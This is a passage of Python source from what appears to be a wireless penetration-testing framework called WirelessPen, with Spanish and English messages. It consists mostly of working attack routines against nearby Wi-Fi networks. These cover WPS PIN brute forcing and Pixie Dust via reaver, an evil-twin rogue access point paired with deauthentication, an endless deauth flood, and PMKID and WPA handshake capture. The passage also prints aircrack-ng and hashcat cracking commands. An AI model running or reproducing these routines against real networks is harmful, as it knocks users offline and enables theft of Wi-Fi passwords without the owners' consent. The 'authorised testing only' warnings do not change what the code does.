            f"{Colors.CYAN}│{Colors.YELLOW}{i:4} {Colors.RESET}{Colors.CYAN}│{Colors.RESET} {bssid:<17} {Colors.CYAN}│{Colors.RESET} {channel:>2} {Colors.CYAN}│{Colors.RESET} {power_display} {Colors.CYAN}│{Colors.RESET} {enc_color}{encryption:<8}{Colors.RESET} {Colors.CYAN}│{Colors.RESET} {essid:<23} {Colors.CYAN}│{Colors.RESET}"
        )

    print(
        f"{Colors.CYAN}╰─────┴───────────────────┴────┴──────┴──────────┴─────────────────────────╯{Colors.RESET}\n"
    )

    # Network selection with enhanced features
    while True:
        try:
            print(f"{Colors.YELLOW}📌 SELECTION OPTIONS:{Colors.RESET}")
            print(f"  • Enter number (1-{len(networks)}) to select target")
            print(f"  • Enter {Colors.CYAN}'0'{Colors.RESET} to cancel")
            print(f"  • Enter {Colors.CYAN}'r'{Colors.RESET} to rescan")
            print(
                f"  • Enter {Colors.CYAN}'s'{Colors.RESET} to sort by different criteria"
            )
            print(f"  • Enter {Colors.CYAN}'f'{Colors.RESET} to filter networks")

            choice = input(f"\n{Colors.BOLD}Selection: {Colors.RESET}").strip().lower()

            if choice == "0":
                return None
            elif choice == "r":
                print(f"\n{Colors.INFO} Rescanning...")
                return scan_networks(scan_time, target_channel)
            elif choice == "s":
                # Sort options
                print(f"\n{Colors.YELLOW}Sort by:{Colors.RESET}")
                print("  1) Signal strength (current)")
                print("  2) Channel")
                print("  3) Encryption type")
                print("  4) ESSID (alphabetical)")

                sort_choice = input("Sort option [1-4]: ").strip()
                if sort_choice == "2":
                    networks.sort(key=lambda x: int(x.get("channel", "0")))
                elif sort_choice == "3":
                    networks.sort(key=lambda x: x.get("encryption", ""))
                elif sort_choice == "4":
                    networks.sort(key=lambda x: x.get("essid", "").lower())
                else:
                    networks.sort(
                        key=lambda x: int(x.get("power", "-100")), reverse=True
                    )

                # Redisplay with new sorting
                continue
            elif choice == "f":
                # Filter options
                print(f"\n{Colors.YELLOW}Filter by:{Colors.RESET}")
                print("  1) WPA2/WPA3 only")
                print("  2) Strong signals (-60 dBm or better)")
                print("  3) Specific channel")

                filter_choice = input("Filter option [1-3]: ").strip()

                if filter_choice == "1":
                    networks = [n for n in networks if "WPA" in n.get("encryption", "")]
                elif filter_choice == "2":
                    networks = [
                        n for n in networks if int(n.get("power", "-100")) >= -60
                    ]
                elif filter_choice == "3":
                    ch = input("Enter channel (1-14): ").strip()
                    networks = [n for n in networks if n.get("channel") == ch]

                if not networks:
                    print(f"{Colors.WARNING} No networks match filter criteria")
                    return None

                continue

            # Try to parse as number
            try:
                num_choice = int(choice)
                if 1 <= num_choice <= len(networks):
                    selected = networks[num_choice - 1]

                    print(f"\n{Colors.SUCCESS} Selected target:")
                    print(f"  ESSID:      {selected.get('essid', '<Hidden>')}")
                    print(f"  BSSID:      {selected.get('bssid')}")
                    print(f"  Channel:    {selected.get('channel')}")
                    print(f"  Power:      {selected.get('power')} dBm")
                    print(f"  Security:   {selected.get('encryption')}")

                    confirm = (
                        input(f"\n{Colors.YELLOW}Confirm target? [Y/n]: {Colors.RESET}")
                        .strip()
                        .lower()
                    )
                    if confirm != "n":
                        state.target_network = selected
                        return selected
                else:
                    print(
                        f"{Colors.FAILURE} Invalid selection. Choose 1-{len(networks)}"
                    )
            except ValueError:
                print(
                    f"{Colors.FAILURE} Invalid input. Enter a number, 'r', 's', 'f', or '0'"
                )

        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING} Selection cancelled")
            return None


def parse_airodump_csv(csv_file):
    """Parsea el archivo CSV de airodump-ng"""
    networks = []

    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()

        # Encontrar la sección de APs
        ap_section = False
        for line in lines:
            if "BSSID" in line and "First time seen" in line:
                ap_section = True
                continue

            if ap_section and line.strip() == "":
                break

            if ap_section and line.strip():
                parts = [p.strip() for p in line.split(",")]

                if len(parts) >= 14:
                    bssid = parts[0]
                    channel = parts[3]
                    power = parts[8]
                    encryption = parts[5]
                    essid = parts[13] if parts[13] else "<Hidden>"

                    # Filtrar solo redes con cifrado WPA/WPA2
                    if "WPA" in encryption:
                        networks.append(
                            {
                                "bssid": bssid,
                                "channel": channel,
                                "power": power,
                                "encryption": encryption,
                                "essid": essid,
                            }
                        )

    except Exception as e:
        print(f"{Colors.RED}[!]{Colors.RESET} Error al parsear CSV: {e}")

    return networks


def attack_wps():
    """Ataque WPS con reaver y bully"""
    target = scan_networks_wps()
    if not target:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} No se seleccionó ningún objetivo WPS")
        return False

    interface = state.monitor_interface
    bssid = target["bssid"]
    channel = target["channel"]
    essid = target["essid"]

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                    📡 WIRELESSPEN - WPS PIN ATTACK                         {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )
    print(f"  {Colors.BOLD}Objetivo WPS:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
    print(f"    Canal:   {channel}")
    print(f"  {Colors.BOLD}Método:{Colors.RESET}  PIN Brute Force")
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}\n")

    # Fijar canal
    run_command(f"iwconfig {interface} channel {channel}")
    time.sleep(1)

    # Intentar con reaver primero
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Iniciando ataque WPS con Reaver...")
    cmd_reaver = f"reaver -i {interface} -b {bssid} -c {channel} -vv -d 15 -t 30 -K 1"

    try:
        print(f"{Colors.GRAY}    Comando: {cmd_reaver}{Colors.RESET}")
        print(f"{Colors.GRAY}    Presione Ctrl+C para detener{Colors.RESET}\n")

        result = subprocess.run(cmd_reaver, shell=True, timeout=600)

        if result.returncode == 0:
            print(f"\n{Colors.GREEN}✓ Ataque WPS completado exitosamente{Colors.RESET}")
            return True
    except subprocess.TimeoutExpired:
        print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Timeout del ataque WPS")
    except KeyboardInterrupt:
        print(
            f"\n{Colors.YELLOW}[*]{Colors.RESET} Ataque WPS interrumpido por el usuario"
        )

    return False


def attack_pixie():
    """Ataque Pixie Dust (WPS)"""
    target = scan_networks_wps()
    if not target:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} No se seleccionó ningún objetivo WPS")
        return False

    interface = state.monitor_interface
    bssid = target["bssid"]
    channel = target["channel"]
    essid = target["essid"]

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                    📡 WIRELESSPEN - PIXIE DUST ATTACK                     {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )
    print(f"  {Colors.BOLD}Objetivo:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
    print(f"    Canal:   {channel}")
    print(f"  {Colors.BOLD}Método:{Colors.RESET}  Pixie Dust (CVE-2014-4910)")
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}\n")

    # Pixie Dust con reaver
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Iniciando ataque Pixie Dust...")
    cmd_pixie = f"reaver -i {interface} -b {bssid} -c {channel} -K 1 -f -N -g 1 -vv"

    try:
        print(f"{Colors.GRAY}    Comando: {cmd_pixie}{Colors.RESET}")
        result = subprocess.run(cmd_pixie, shell=True, timeout=300)

        if result.returncode == 0:
            print(f"\n{Colors.GREEN}✓ Pixie Dust attack completado{Colors.RESET}")
            return True
    except subprocess.TimeoutExpired:
        print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Timeout del ataque Pixie Dust")
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Ataque interrumpido")

    return False


def attack_evil_twin():
    """Ataque Evil Twin (AP Falso)"""
    target = scan_networks()
    if not target:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} No se seleccionó ningún objetivo")
        return False

    interface = state.monitor_interface
    bssid = target["bssid"]
    essid = target["essid"]
    channel = target["channel"]

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                    📡 WIRELESSPEN - EVIL TWIN ATTACK                      {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )
    print(f"  {Colors.BOLD}Objetivo:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
    print(f"    Canal:   {channel}")
    print(f"  {Colors.BOLD}Método:{Colors.RESET}  Rogue Access Point")
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}\n")

    # Crear directorio para logs
    evil_dir = os.path.expanduser("~/evil_twin_logs")
    os.makedirs(evil_dir, exist_ok=True)

    # Configurar hostapd
    hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""

    with open(f"{evil_dir}/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    print(f"{Colors.YELLOW}[*]{Colors.RESET} Configurando Evil Twin AP...")
    print(f"{Colors.YELLOW}[*]{Colors.RESET} SSID: {essid}")
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Password temporal: 12345678")
    print(f"{Colors.RED}[!]{Colors.RESET} ADVERTENCIA: Solo para testing autorizado")

    # Iniciar deauth en el AP original
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Iniciando deauth al AP original...")
    deauth_cmd = f"aireplay-ng --deauth 0 -a {bssid} {interface}"

    try:
        proc_deauth = subprocess.Popen(
            deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Esperar y luego iniciar hostapd
        time.sleep(5)
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Iniciando Evil Twin AP...")

        hostapd_cmd = f"hostapd {evil_dir}/hostapd.conf"
        result = subprocess.run(hostapd_cmd, shell=True, timeout=300)

        proc_deauth.terminate()

        if result.returncode == 0:
            print(f"\n{Colors.GREEN}✓ Evil Twin ejecutado{Colors.RESET}")
            return True

    except subprocess.TimeoutExpired:
        print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Timeout del Evil Twin")
        try:
            proc_deauth.terminate()
        except (ProcessLookupError, AttributeError):
            pass
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Evil Twin interrumpido")
        try:
            proc_deauth.terminate()
        except (ProcessLookupError, AttributeError):
            pass

    return False


def attack_deauth():
    """Ataque de Deautenticación Masiva"""
    target = scan_networks()
    if not target:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} No se seleccionó ningún objetivo")
        return False

    interface = state.monitor_interface
    bssid = target["bssid"]
    essid = target["essid"]
    channel = target["channel"]

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                  📡 WIRELESSPEN - DEAUTHENTICATION ATTACK                {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )
    print(f"  {Colors.BOLD}Objetivo:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
    print(f"    Canal:   {channel}")
    print(f"  {Colors.BOLD}Método:{Colors.RESET}  Deauthentication Flood")
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}\n")

    # Fijar canal
    run_command(f"iwconfig {interface} channel {channel}")
    time.sleep(1)

    print(
        f"{Colors.YELLOW}[*]{Colors.RESET} Iniciando ataque de deautenticación masiva..."
    )
    print(
        f"{Colors.RED}[!]{Colors.RESET} ADVERTENCIA: Esto desconectará a todos los clientes"
    )
    print(f"{Colors.GRAY}    Presione Ctrl+C para detener{Colors.RESET}\n")

    try:
        # Deauth continuo
        while True:
            run_command(f"aireplay-ng --deauth 100 -a {bssid} {interface}")
            print(
                f"{Colors.CYAN}[*]{Colors.RESET} Enviados 100 paquetes de deauth a {essid}"
            )
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Ataque de deauth detenido")
        return True

    return False


def attack_pmkid_hashcat():
    """Ataque PMKID optimizado para Hashcat"""
    target = scan_networks()
    if not target:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} No se seleccionó ningún objetivo")
        return False

    interface = state.monitor_interface
    bssid = target["bssid"]
    essid = target["essid"]
    channel = target["channel"]

    # Crear directorio de salida
    output_dir = os.path.expanduser("~/pmkid_hashes")
    os.makedirs(output_dir, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = f"{output_dir}/pmkid_{essid}_{timestamp}"

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                   📡 WIRELESSPEN - PMKID HASHCAT ATTACK                  {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )
    print(f"  {Colors.BOLD}Objetivo:{Colors.RESET}")
    print(f"    ESSID:   {essid}")
    print(f"    BSSID:   {bssid}")
    print(f"    Canal:   {channel}")
    print(f"  {Colors.BOLD}Archivo:{Colors.RESET}  {output_file}")
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}\n")

    # Usar hcxdumptool para capturar PMKID
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Capturando PMKID con hcxdumptool...")
    cmd_hcx = f"timeout 60 hcxdumptool -i {interface} --enable_status=1 -o {output_file}.pcapng"

    try:
        subprocess.run(cmd_hcx, shell=True)

        if os.path.exists(f"{output_file}.pcapng"):
            print(f"{Colors.GREEN}✓{Colors.RESET} Captura completada")

            # Convertir a formato hashcat
            print(f"{Colors.YELLOW}[*]{Colors.RESET} Convirtiendo a formato Hashcat...")
            convert_cmd = f"hcxpcapngtool -o {output_file}.hash {output_file}.pcapng"

            code, _, _ = run_command(convert_cmd)

            if code == 0 and os.path.exists(f"{output_file}.hash"):
                print(f"\n{Colors.GREEN}{'='*80}")
                print("  ✓ ¡PMKID CAPTURADO Y CONVERTIDO!")
                print(f"{'='*80}{Colors.RESET}\n")
                print(f"Hash file: {output_file}.hash")
                print("\nPara crackear con Hashcat:")
                print(f"  hashcat -m 16800 {output_file}.hash wordlist.txt")
                return True
            else:
                print(f"{Colors.YELLOW}[!]{Colors.RESET} No se pudo convertir el hash")
                return False
        else:
            print(f"{Colors.RED}[!]{Colors.RESET} No se capturó PMKID")
            return False

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Captura PMKID interrumpida")
        return False


def scan_networks_wps():
    """Escanea redes con WPS habilitado"""
    if not state.monitor_interface:
        print(f"{Colors.RED}[!]{Colors.RESET} El modo monitor no está activado")
        return None

    interface = state.monitor_interface

    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Escaneando redes con WPS habilitado...")
    print(f"{Colors.GRAY}    Presione Ctrl+C para detener el escaneo{Colors.RESET}\n")

    # Escanear con wash
    cmd_wash = f"timeout 30 wash -i {interface}"

    try:
        code, output, _ = run_command(cmd_wash)

        if not output.strip():
            print(f"\n{Colors.YELLOW}[!]{Colors.RESET} No se detectaron redes con WPS")
            return None

        # Parsear salida de wash
        networks = []
        lines = output.strip().split("\n")

        for line in lines[2:]:  # Saltar headers
            if line.strip() and len(line.split()) >= 6:
                parts = line.split()
                bssid = parts[0]
                channel = parts[1]
                rssi = parts[2]
                wps_version = parts[3]
                wps_locked = parts[4]
                essid = " ".join(parts[5:]) if len(parts) > 5 else "<Hidden>"

                networks.append(
                    {
                        "bssid": bssid,
                        "channel": channel,
                        "rssi": rssi,
                        "wps_version": wps_version,
                        "wps_locked": wps_locked,
                        "essid": essid,
                    }
                )

        if not networks:
            print(
                f"\n{Colors.YELLOW}[!]{Colors.RESET} No se detectaron redes WPS válidas"
            )
            return None

        # Mostrar redes WPS
        print(f"\n{Colors.CYAN}{'='*90}")
        print(
            f"{Colors.BOLD}  #  | {'BSSID':<17} | {'CH':<3} | {'RSSI':<4} | {'VER':<4} | {'LOCK':<4} | ESSID"
        )
        print(f"{Colors.CYAN}{'='*90}{Colors.RESET}")

        for i, net in enumerate(networks, 1):
            lock_status = "YES" if net["wps_locked"] == "Yes" else "NO"
            lock_color = Colors.RED if lock_status == "YES" else Colors.GREEN

            print(
                f"{Colors.YELLOW}{i:3}{Colors.RESET} | {net['bssid']:<17} | {net['channel']:<3} | {net['rssi']:<4} | {net['wps_version']:<4} | {lock_color}{lock_status:<4}{Colors.RESET} | {net['essid']}"
            )

        print(f"{Colors.CYAN}{'='*90}{Colors.RESET}\n")

        # Seleccionar red
        while True:
            try:
                choice = input(
                    f"{Colors.BOLD}Seleccione el número de la red WPS (0 para cancelar): {Colors.RESET}"
                )
                choice = int(choice)

                if choice == 0:
                    return None

                if 1 <= choice <= len(networks):
                    selected = networks[choice - 1]
                    print(
                        f"\n{Colors.GREEN}✓{Colors.RESET} Red WPS seleccionada: {selected.get('essid', '<Hidden>')} ({selected.get('bssid')})"
                    )
                    return selected
                else:
                    print(f"{Colors.RED}[!]{Colors.RESET} Selección inválida")
            except ValueError:
                print(f"{Colors.RED}[!]{Colors.RESET} Ingrese un número válido")
            except KeyboardInterrupt:
                print("\n")
                return None

    except KeyboardInterrupt:
        print("\n")
        return None


def attack_handshake() -> bool:
    """
    Advanced WPA/WPA2/WPA3 handshake capture with intelligent deauthentication.

    Returns:
        True if handshake captured successfully, False otherwise
    """
    # Get or select target network
    target = state.target_network or scan_networks()
    if not target:
        print(f"{Colors.WARNING} No target selected")
        return False

    interface = state.monitor_interface
    bssid = target["bssid"]
    channel = target["channel"]
    essid = target["essid"]

    # Create output directory
    os.makedirs(state.output_directory, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = os.path.join(
        state.output_directory, f"handshake_{essid.replace(' ', '_')}_{timestamp}"
    )

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                      🤝 WPA/WPA2 HANDSHAKE CAPTURE                        {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    print(f"{Colors.INFO} Target Network:")
    print(f"  ESSID:      {Colors.CYAN}{essid}{Colors.RESET}")
    print(f"  BSSID:      {Colors.YELLOW}{bssid}{Colors.RESET}")
    print(f"  Channel:    {Colors.GREEN}{channel}{Colors.RESET}")
    print(
        f"  Security:   {Colors.PURPLE}{target.get('encryption', 'Unknown')}{Colors.RESET}"
    )
    print(f"\n{Colors.INFO} Output file: {Colors.GRAY}{output_file}.cap{Colors.RESET}")

    # Set channel and prepare interface
    print(f"\n{Colors.YELLOW}[1/4]{Colors.RESET} Preparing interface...")
    code, _, stderr = run_command(f"iwconfig {interface} channel {channel}", timeout=10)
    if code != 0:
        print(f"{Colors.FAILURE} Failed to set channel: {stderr}")
        return False

    # Verify no conflicting processes
    run_command("pkill -f airodump-ng", timeout=5)
    run_command("pkill -f aireplay-ng", timeout=5)
    time.sleep(2)

    # Start airodump-ng capture
    print(f"{Colors.YELLOW}[2/4]{Colors.RESET} Starting packet capture...")

    airodump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {output_file} --output-format cap {interface}"

    if state.verbose_mode:
        print(f"{Colors.GRAY}[DEBUG] Airodump command: {airodump_cmd}{Colors.RESET}")

    try:
        # Start airodump process
        proc_airodump = run_command_async(airodump_cmd)
        time.sleep(3)

        # Check if process is running
        if proc_airodump.poll() is not None:
            print(f"{Colors.FAILURE} Airodump-ng failed to start")
            return False

        print(f"{Colors.SUCCESS} Packet capture started")

        # Scan for connected clients
        print(f"{Colors.YELLOW}[3/4]{Colors.RESET} Scanning for connected clients...")

        # Wait a bit to capture some data
        time.sleep(5)

        # Check for clients in the CSV file
        csv_file = f"{output_file}-01.csv"
        clients = []

        if os.path.exists(csv_file):
            clients = parse_clients_from_csv(csv_file, bssid)

        if clients:
            print(f"{Colors.SUCCESS} Found {len(clients)} connected client(s):")
            for i, client in enumerate(clients, 1):
                print(f"  {i}. {client}")
        else:
            print(
                f"{Colors.WARNING} No clients detected - will perform broadcast deauth"
            )

        # Deauthentication phase
        print(
            f"{Colors.YELLOW}[4/4]{Colors.RESET} Performing intelligent deauthentication..."
        )

        handshake_captured = False
        deauth_rounds = 0
        max_rounds = 5

        while deauth_rounds < max_rounds and not handshake_captured:
            deauth_rounds += 1
            print(
                f"\n{Colors.CYAN}   Round {deauth_rounds}/{max_rounds}:{Colors.RESET}"
            )

            if clients:
                # Target specific clients
                for client in clients:
                    print(f"     {Colors.ARROW} Deauthing client: {client}")
                    run_command(
                        f"aireplay-ng --deauth {CONFIG['DEAUTH_COUNT']} -a {bssid} -c {client} {interface}",
                        timeout=15,
                    )
                    time.sleep(2)
            else:
                # Broadcast deauth
                print(f"     {Colors.ARROW} Broadcast deauthentication")
                run_command(
                    f"aireplay-ng --deauth {CONFIG['DEAUTH_COUNT']} -a {bssid} {interface}",
                    timeout=15,
                )

            # Wait and check for handshake
            print(f"     {Colors.GRAY}Waiting for handshake...{Colors.RESET}")
            time.sleep(10)

            # Quick handshake check
            cap_file = f"{output_file}-01.cap"
            if os.path.exists(cap_file):
                code, result, _ = run_command(
                    f"aircrack-ng '{cap_file}' 2>/dev/null | grep -i handshake",
                    timeout=10,
                )
                if code == 0 and result.strip():
                    handshake_captured = True
                    break

        # Final wait for user interaction
        if not handshake_captured:
            print(f"\n{Colors.YELLOW}⏳ Extended capture mode...{Colors.RESET}")
            print(
                f"{Colors.GRAY}   Press Ctrl+C when you see 'WPA handshake' or after sufficient time{Colors.RESET}"
            )
            try:
                # Continue until user interruption or timeout
                time.sleep(CONFIG["HANDSHAKE_TIMEOUT"])
            except KeyboardInterrupt:
                pass

        print(f"\n{Colors.INFO} Stopping packet capture...")
        kill_process_group(proc_airodump)
        time.sleep(2)

    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING} Capture interrupted by user")
        try:
            kill_process_group(proc_airodump)
        except (ProcessLookupError, AttributeError):
            pass
        time.sleep(2)
    except Exception as e:
        print(f"{Colors.FAILURE} Capture failed: {e}")
        return False

    # Comprehensive handshake verification
    print(f"\n{Colors.CYAN}🔍 HANDSHAKE VERIFICATION:{Colors.RESET}")

    cap_file = f"{output_file}-01.cap"
    if not os.path.exists(cap_file):
        print(f"{Colors.FAILURE} Capture file not found: {cap_file}")
        return False

    # Check file size
    file_size = os.path.getsize(cap_file)
    print(f"  File size: {Colors.YELLOW}{file_size:,} bytes{Colors.RESET}")

    if file_size < 1024:  # Less than 1KB is suspicious
        print(f"{Colors.FAILURE} Capture file too small - likely no data captured")
        return False

    # Detailed handshake verification
    print(f"  {Colors.GRAY}Analyzing capture with aircrack-ng...{Colors.RESET}")

    code, result, stderr = run_command(
        f"aircrack-ng '{cap_file}' 2>/dev/null", timeout=30
    )

    handshake_found = False
    handshake_quality = "Unknown"

    if "handshake" in result.lower():
        handshake_found = True
        # Try to determine handshake quality
        if "4-way handshake" in result.lower():
            handshake_quality = "Complete 4-way"
        elif "pmkid" in result.lower():
            handshake_quality = "PMKID"
        else:
            handshake_quality = "Partial"

    # Alternative verification with tshark if available
    if not handshake_found:
        print(f"  {Colors.GRAY}Attempting alternative verification...{Colors.RESET}")
        code, tshark_result, _ = run_command(
            f"tshark -r '{cap_file}' -Y 'wlan.fc.type_subtype == 0x08 || eapol' -c 10 2>/dev/null",
            timeout=15,
        )
        if code == 0 and ("EAPOL" in tshark_result or "802.11" in tshark_result):
            handshake_found = True
            handshake_quality = "Detected via tshark"

    # Results
    if handshake_found:
        print(
            f"\n{Colors.SUCCESS} {Colors.GREEN}HANDSHAKE SUCCESSFULLY CAPTURED!{Colors.RESET}\n"
        )
        print(
            f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
        )
        print(
            f"{Colors.CYAN}║{Colors.WHITE}                            CAPTURE RESULTS                                 {Colors.CYAN}║{Colors.RESET}"
        )
        print(
            f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}"
        )
        print(f"  Target:      {essid} ({bssid})")
        print(f"  Quality:     {handshake_quality}")
        print(f"  File:        {cap_file}")
        print(f"  Size:        {file_size:,} bytes")
        print(f"  Session:     {state.session_id}")

        # Provide cracking instructions
        print(f"\n{Colors.YELLOW}🔓 CRACKING INSTRUCTIONS:{Colors.RESET}")

        # Find available wordlists
        wordlists = []
        for wl_path in CONFIG["WORDLIST_PATHS"]:
            expanded_path = os.path.expanduser(wl_path)
            if os.path.exists(expanded_path):
                wordlists.append(expanded_path)

        print(f"  {Colors.BOLD}Using aircrack-ng:{Colors.RESET}")
        if wordlists:
            print(f"    aircrack-ng -w '{wordlists[0]}' '{cap_file}'")
        else:
            print(f"    aircrack-ng -w /path/to/wordlist.txt '{cap_file}'")

        print(f"\n  {Colors.BOLD}Using hashcat (if available):{Colors.RESET}")
        print("    # Convert to hashcat format first:")
        print(f"    hcxpcapngtool -o '{output_file}.hash' '{cap_file}'")
        print("    # Then crack with hashcat:")
        if wordlists:
            print(f"    hashcat -m 22000 '{output_file}.hash' '{wordlists[0]}'")
        else:
            print(f"    hashcat -m 22000 '{output_file}.hash' /path/to/wordlist.txt")

        if wordlists:
            print(
                f"\n{Colors.INFO} Available wordlist: {Colors.CYAN}{wordlists[0]}{Colors.RESET}"
            )
        else:
            print(
                f"\n{Colors.WARNING} No common wordlists found. Download rockyou.txt or similar."
            )

        return True
    else:
        print(f"\n{Colors.FAILURE} {Colors.RED}NO HANDSHAKE CAPTURED{Colors.RESET}")
        print(f"\n{Colors.YELLOW}💡 TROUBLESHOOTING:{Colors.RESET}")
        print("  • Ensure clients are connected to the network")
        print("  • Try increasing deauth packet count")
        print("  • Check if network uses WPA3 (requires different approach)")
        print("  • Verify monitor mode is working correctly")
        print("  • Consider using PMKID attack for clientless networks")

        return False


def parse_clients_from_csv(csv_file: str, target_bssid: str) -> List[str]:
    """
    Parse connected clients from airodump CSV output.

    Args:
        csv_file: Path to airodump CSV file
        target_bssid: Target AP BSSID to filter clients

    Returns:
        List of client MAC addresses
    """
    clients = []

    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # Find the clients section (after empty line)
        lines = content.split("\n")
        client_section = False

        for line in lines:
            # Look for client section header
            if "Station MAC" in line and "First time seen" in line:
                client_section = True
                continue

            # Skip empty lines and headers
            if not client_section or not line.strip():
                continue

            # Parse client data
            parts = [p.strip() for p in line.split(",")]

            if len(parts) >= 6:
                client_mac = parts[0]
                associated_bssid = parts[5]

                # Check if client is associated with our target
                if associated_bssid == target_bssid and client_mac:
                    clients.append(client_mac)

    except Exception as e:
        if state.verbose_mode:
            print(f"{Colors.GRAY}[DEBUG] Error parsing clients: {e}{Colors.RESET}")

    return clients


def main():
    """Enhanced main function with comprehensive argument handling."""
    # Enhanced argument parser
    parser = argparse.ArgumentParser(
        description="WirelessPen v2.2.0 - Professional Wireless Penetration Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  {Colors.CYAN}%(prog)s{Colors.RESET}                           # Interactive mode
  {Colors.CYAN}%(prog)s{Colors.RESET} handshake -i wlan0        # Handshake attack
  {Colors.CYAN}%(prog)s{Colors.RESET} scan -i wlan0 --time 60   # Extended network scan
  {Colors.CYAN}%(prog)s{Colors.RESET} pmkid --auto              # Automated PMKID attack
  {Colors.CYAN}%(prog)s{Colors.RESET} --check                   # System diagnostics

For detailed help: %(prog)s --help-full
        """,
    )

    # Attack modes
    parser.add_argument(
        "attack",
        nargs="?",
        choices=["handshake", "pmkid", "wps", "pixie", "deauth", "scan", "evil_twin"],
        help="Attack mode",
    )

    # Interface options
    parser.add_argument(
        "-i", "--interface", metavar="IFACE", help="WiFi interface (e.g., wlan0)"
    )
    parser.add_argument(
        "-t", "--target", metavar="BSSID", help="Target BSSID (MAC address)"
    )
    parser.add_argument(
        "-c",
        "--channel",
        metavar="CH",
        type=int,
        help="Specific channel to target (1-14)",
    )

    # Scan options
    parser.add_argument("--scan", action="store_true", help="Scan for networks")
    parser.add_argument(
        "--scan-time",
        type=int,
        default=30,
        metavar="SEC",
        help="Scan duration in seconds (default: 30)",
    )

    # Attack options
    parser.add_argument(
        "--deauth-count",
        type=int,
        default=20,
        metavar="N",
        help="Deauth packet count (default: 20)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=300,
        metavar="SEC",
        help="Attack timeout in seconds (default: 300)",
    )
    parser.add_argument(
        "--auto", action="store_true", help="Automated mode (minimal interaction)"
    )

    # Output options
    parser.add_argument(
        "-o", "--output", metavar="DIR", help="Output directory for results"
    )
